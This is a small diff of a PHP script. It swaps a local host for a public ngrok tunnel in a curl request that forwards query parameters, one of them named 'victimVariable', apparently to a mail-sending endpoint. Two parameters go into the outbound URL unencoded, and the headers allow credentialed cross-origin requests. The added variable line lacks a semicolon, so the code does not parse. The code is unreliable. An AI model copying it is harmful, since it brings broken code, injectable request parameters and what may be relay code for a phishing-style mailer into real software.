@@ -2,7 +2,7 @@
 header('Access-Control-Allow-Credentials:true');
 header('Access-Control-Allow-Methods:GET,HEAD,OPTIONS,POST,PUT');
 header('Access-Control-Allow-Headers:Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers, cache-control');
-   
+   $ngrokSubdomain = '884f1c56'
    
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\Exception;
@@ -18,7 +18,7 @@ header('Access-Control-Allow-Headers:Access-Control-Allow-Headers, Origin,Accept
       $curl=curl_init();
       curl_setopt_array($curl, [
          CURLOPT_RETURNTRANSFER => 1,
-         CURLOPT_URL => 'http://TFD-PC/php/email2.php?victimVariable='.$_GET['victimVariable'].'&editName='.$_GET['editName'].'&editMessage='.urlencode($_GET['editMessage'])
+         CURLOPT_URL => 'https://'.$ngrokSubdomain.'.ngrok.io/php/email2.php?victimVariable='.$_GET['victimVariable'].'&editName='.$_GET['editName'].'&editMessage='.urlencode($_GET['editMessage'])
       ]);
       
       curl_exec($curl);
